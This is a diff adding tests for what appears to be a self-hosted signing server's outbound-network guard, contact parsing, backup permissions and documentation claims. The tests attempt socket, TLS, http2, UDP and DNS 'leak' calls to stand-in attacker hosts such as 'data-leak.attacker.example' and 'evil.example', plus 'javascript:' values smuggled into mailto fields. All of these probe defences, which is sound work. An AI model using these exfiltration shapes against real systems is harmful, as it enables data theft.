@@ -708,3 +708,171 @@ test('container: not root, a health check, one volume, one replica, egress denie
   // The smoke test really starts the container without a network.
   assert.match(read('scripts/container-smoke.sh'), /docker run -d [^\n]*--network none --read-only/);
 });
+
+// ---- After the skeptic's probes (tests/out/verify-ds-self-host/guard-probe.mjs) ---------------------------------------
+
+test('outside: every door a connection can take is held: a bare socket, TLS in an allowed name, http2, UDP and name lookups', async () => {
+  const http2 = (await import('node:http2')).default;
+  const dgram = (await import('node:dgram')).default;
+  const OUT = '198.51.100.9';
+  const own = Object.values(os.networkInterfaces()).flat().find((i) => i && i.family === 'IPv4' && !i.internal)?.address;
+  // Stand-ins for the resolver, set before the guard so the guard wraps them: they count what reaches the DNS.
+  const asked: string[] = [];
+  const real = { lookup: dns.lookup, txt: dns.resolveTxt, plookup: dns.promises.lookup, r4: dns.Resolver.prototype.resolve4, pmx: dns.promises.Resolver.prototype.resolveMx, udp: dgram.Socket.prototype.send };
+  (dns as any).lookup = (h: string, o: any, cb?: any) => (asked.push(`lookup ${h}`), setImmediate(() => (typeof o === 'function' ? o : cb)(null, '127.0.0.1', 4)));
+  (dns as any).resolveTxt = (h: string, cb: any) => (asked.push(`txt ${h}`), setImmediate(() => cb(null, [])));
+  (dns.promises as any).lookup = async (h: string) => (asked.push(`plookup ${h}`), { address: '127.0.0.1', family: 4 });
+  (dns.Resolver.prototype as any).resolve4 = function (h: string, ...rest: any[]) { asked.push(`r4 ${h}`); setImmediate(() => rest[rest.length - 1](null, [])); };
+  (dns.promises.Resolver.prototype as any).resolveMx = async (h: string) => (asked.push(`pmx ${h}`), []);
+  let sent = 0;
+  dgram.Socket.prototype.send = function (this: any, ...a: any[]) { sent++; const cb = a[a.length - 1]; if (typeof cb === 'function') setImmediate(cb, null, 0); } as any;
+  const before = { connect: net.Socket.prototype.connect, send: dgram.Socket.prototype.send, uconnect: dgram.Socket.prototype.connect };
+  const local = net.createServer((s) => s.end());
+  await new Promise<void>((r) => local.listen(0, '127.0.0.1', r));
+  const port = (local.address() as net.AddressInfo).port;
+  const undo = installOutsideGuard({ OUTSIDE_CALLS: 'none', OUTBOUND_ALLOW: 'allowed.example' });
+  const u = dgram.createSocket('udp4');
+  u.on('error', () => {});
+  try {
+    const p = g.__sgOutsidePolicy;
+    // An allowed TLS server name does not make an address allowed.
+    assert.ok(!connectAllowed(p, OUT, 'allowed.example'));
+    assert.ok(connectAllowed(p, '127.0.0.1', 'allowed.example'));
+    assert.ok(connectAllowed(p, 'allowed.example', 'allowed.example'));
+    // TCP, by every shape the skeptic got through with.
+    await refusedSocket(new net.Socket().connect(port, OUT), /does not connect to 198\.51\.100\.9/);
+    await refusedSocket(new net.Socket().connect({ port, host: OUT }), /does not connect to 198\.51\.100\.9/);
+    await refusedSocket(tls.connect({ port, host: OUT, servername: 'allowed.example' }), /does not connect to 198\.51\.100\.9/);
+    await refusedSocket((tls as any).connect(port, { host: OUT }), /does not connect to 198\.51\.100\.9/);
+    await refusedSocket((tls as any).connect(port, OUT, { servername: 'allowed.example' }), /does not connect to 198\.51\.100\.9/);
+    await refusedSocket(new tls.TLSSocket(undefined as any).connect({ port, host: OUT }) as any, /does not connect to 198\.51\.100\.9/);
+    // http2 says "connect" for a session whose socket already failed (Node does that on purpose), so what counts is
+    // the error it gives and, below, that nothing arrived at a server on this machine's own outside address.
+    const h2: any = await new Promise((resolve) => http2.connect(`http://${OUT}:${port}`).on('error', resolve));
+    assert.equal(h2.code, 'EOUTSIDE');
+    if (own) {
+      let arrived = 0;
+      const outer = net.createServer((s) => (arrived++, s.destroy()));
+      await new Promise<void>((r) => outer.listen(0, own, r));
+      const op = (outer.address() as net.AddressInfo).port;
+      await refusedSocket(new net.Socket().connect(op, own), /does not connect to/);
+      await refusedSocket(tls.connect({ port: op, host: own, servername: 'allowed.example' }), /does not connect to/);
+      await refusedSocket((tls as any).connect(op, { host: own }), /does not connect to/);
+      assert.equal(((await new Promise((resolve) => http2.connect(`http://${own}:${op}`).on('error', resolve))) as any).code, 'EOUTSIDE');
+      await new Promise((r) => setTimeout(r, 100));
+      outer.close();
+      assert.equal(arrived, 0, 'nothing arrived at the server on the outside address');
+    }
+    // This machine is never outside: a bare socket to it still connects.
+    await new Promise<void>((resolve, reject) => { const s = new net.Socket().connect(port, '127.0.0.1'); s.on('connect', () => (s.destroy(), resolve())); s.on('error', reject); });
+    // UDP: with a callback, without one (an error event), with offset and length, and connect().
+    const e1: any = await new Promise((resolve) => u.send('leak', 53, OUT, resolve));
+    assert.equal(e1?.code, 'EOUTSIDE');
+    const e2: any = await new Promise((resolve) => u.send(Buffer.from('leak'), 0, 4, 53, OUT, resolve));
+    assert.equal(e2?.code, 'EOUTSIDE');
+    const u2 = dgram.createSocket('udp4');
+    const e3: any = await new Promise((resolve) => { u2.on('error', resolve); u2.send('leak', 53, 'evil.example'); });
+    assert.equal(e3?.code, 'EOUTSIDE');
+    const e4: any = await new Promise((resolve) => u2.connect(53, OUT, resolve as any));
+    assert.equal(e4?.code, 'EOUTSIDE');
+    u2.close();
+    assert.equal(sent, 0, 'nothing was sent');
+    await new Promise((resolve) => u.send('fine', 9, '127.0.0.1', resolve));
+    assert.equal(sent, 1, 'this machine itself is not outside');
+    // Names that are not allowed are not asked about, in any of the forms; allowed ones and this machine are.
+    const cbErr = (f: (cb: any) => void) => new Promise<any>((resolve) => f((e: any) => resolve(e)));
+    asked.length = 0; // listening on an address above asked about that address, which goes to no resolver
+    assert.equal((await cbErr((cb) => dns.lookup('data-leak.attacker.example', cb)))?.code, 'EOUTSIDE');
+    assert.equal((await cbErr((cb) => dns.resolveTxt('data-leak.attacker.example', cb)))?.code, 'EOUTSIDE');
+    assert.equal((await cbErr((cb) => new dns.Resolver().resolve4('data-leak.attacker.example', cb)))?.code, 'EOUTSIDE');
+    await assert.rejects(dns.promises.lookup('data-leak.attacker.example'), { code: 'EOUTSIDE' });
+    await assert.rejects(new dns.promises.Resolver().resolveMx('data-leak.attacker.example'), { code: 'EOUTSIDE' });
+    assert.deepEqual(asked, [], 'the resolver was never asked');
+    assert.equal(await cbErr((cb) => dns.lookup('allowed.example', cb)), null);
+    assert.equal(await cbErr((cb) => dns.lookup('localhost', cb)), null);
+    await dns.promises.lookup('allowed.example');
+    assert.deepEqual(asked, ['lookup allowed.example', 'lookup localhost', 'plookup allowed.example']);
+    // A payment link on such a server: the sender is told why it cannot be checked, not to try again in a minute.
+    const { lookHost, hostRefusal } = await import('../src/server/paydns.ts');
+    const check = await lookHost('pay.attacker.example');
+    assert.deepEqual(check, { ok: false, why: 'later', closed: true });
+    assert.match(hostRefusal(check, 'pay.attacker.example'), /set up for a closed network .* OUTBOUND_ALLOW/);
+    // Mode listed: connections are held the same, names are still looked up (that is how a payment link is checked).
+    installOutsideGuard({ OUTSIDE_CALLS: 'listed' });
+    asked.length = 0;
+    await refusedSocket(new net.Socket().connect(port, OUT), /OUTSIDE_CALLS=listed/);
+    assert.equal(await cbErr((cb) => dns.lookup('pay.example.com', cb)), null);
+    assert.deepEqual(asked, ['lookup pay.example.com']);
+  } finally {
+    g.__sgOutsideUndo?.();
+    undo();
+    u.close();
+    local.close();
+    // Taking the guard off puts back exactly what was there.
+    assert.equal(net.Socket.prototype.connect, before.connect);
+    assert.equal(dgram.Socket.prototype.send, before.send);
+    assert.equal(dgram.Socket.prototype.connect, before.uconnect);
+    (dns as any).lookup = real.lookup;
+    (dns as any).resolveTxt = real.txt;
+    (dns.promises as any).lookup = real.plookup;
+    dns.Resolver.prototype.resolve4 = real.r4;
+    dns.promises.Resolver.prototype.resolveMx = real.pmx;
+    dgram.Socket.prototype.send = real.udp;
+  }
+});
+
+test('security contact: mailto: written twice is one address, and an address with a colon in it is none', () => {
+  assert.deepEqual(securityContacts({ SECURITY_CONTACT: 'mailto:mailto:sec@example.org' }), ['mailto:sec@example.org']);
+  assert.deepEqual(securityContacts({ SECURITY_CONTACT: 'MAILTO:mailto:Mailto:sec@example.org, sec@example.org' }), ['mailto:sec@example.org']);
+  for (const bad of ['mailto:javascript:x@example.org', 'javascript:x@example.org', 'mailto:', 'mailto:mailto:', 'data:a@b.cc', 'mailto:a:b@example.org'])
+    assert.deepEqual(securityContacts({ SECURITY_CONTACT: bad }), [], bad);
+  assert.doesNotMatch(securityTxt('https://x.example', { SECURITY_CONTACT: 'mailto:mailto:sec@example.org' })!, /mailto:mailto:/);
+});
+
+test('backup: only the user who made it can read it, and a folder it may not write to is said with what to do', async () => {
+  const { cannotWrite } = await import('../scripts/backup.mjs' as any);
+  const dest = path.join(tmp('backups-mode'), 'made-by-the-script');
+  const r = await backup({ dataDir: dataDir(), dest });
+  const mode = (f: string) => fs.statSync(f).mode & 0o777;
+  assert.equal(mode(dest), 0o700, 'the folder it made');
+  assert.equal(mode(path.join(r.dir, 'sign.db')), 0o600, 'the database, which is not encrypted');
+  assert.equal(mode(path.join(r.dir, MANIFEST)), 0o600);
+  for (const n of fs.readdirSync(path.join(r.dir, 'blobs')).slice(0, 3)) assert.equal(mode(path.join(r.dir, 'blobs', n)), 0o600);
+  assert.equal(verifyBackup(r.dir).ok, true);
+  // What Docker does to ./backups on first use: a folder owned by root, and the backup running as uid 1000.
+  const words = cannotWrite(Object.assign(new Error("EACCES: permission denied, mkdir '/backups/x.partial/blobs'"), { code: 'EACCES' }), '/backups').message;
+  assert.match(words, /^The folder \/backups cannot be written to by the user this runs as/);
+  assert.match(words, /chown 1000:1000 backups\) and run this again\.$/);
+  const other = new Error('disk on fire');
+  assert.equal(cannotWrite(other, '/backups'), other);
+  if (process.getuid?.() !== 0) {
+    const locked = tmp('backups-locked');
+    fs.chmodSync(locked, 0o500);
+    await assert.rejects(backup({ dataDir: dataDir(), dest: locked }), /cannot be written to by the user this runs as/);
+    fs.chmodSync(locked, 0o700);
+  }
+  const compose = read('docker-compose.example.yml');
+  assert.match(compose, /mkdir -p backups && sudo chown 1000:1000 backups/);
+  assert.match(read('README.md'), /docker compose run --rm backup`, after\s+`mkdir -p backups && sudo chown 1000:1000 backups`/);
+});
+
+test('words: nothing on the pages or in the papers says more than the code does', () => {
+  // The page on reporting a weakness sends nobody to a help form that no person reads.
+  const page = read('src/app/security/disclosure/page.tsx');
+  assert.match(page, /const reachable = supportReachable\(\);/);
+  assert.match(page, /: reachable\s+\? <>Use the <Link href="\/help\?topic=other#contact">help form<\/Link>[^\n]*It reaches the people who run this server\./);
+  assert.match(page, /would reach no person/);
+  // /security says what the guard sees, and no flat "connects only".
+  const outside = read('src/app/security/Outside.tsx');
+  assert.doesNotMatch(outside, /connects only to|checks connections the server opens itself|Every service below|makes no outside calls/);
+  assert.match(outside, /not a firewall/);
+  // Office files: no network only where unshare works, and it does not in the container as shipped.
+  const controls = read('docs/controls.md');
+  assert.doesNotMatch(controls, /separate process with no network/);
+  assert.match(controls, /no network only where `unshare -rn` works/);
+  for (const f of ['Dockerfile', 'docker-compose.example.yml', 'README.md']) assert.match(read(f), /unshare -rn/, f);
+  // "Nothing that calls home" outside Docker too: the build and dev scripts switch the framework's statistics off.
+  const scripts = JSON.parse(read('package.json')).scripts;
+  for (const k of ['build', 'dev']) assert.match(scripts[k], /^NEXT_TELEMETRY_DISABLED=1 next /, k);
+  assert.match(read('README.md'), /NEXT_TELEMETRY_DISABLED=1/);
+});
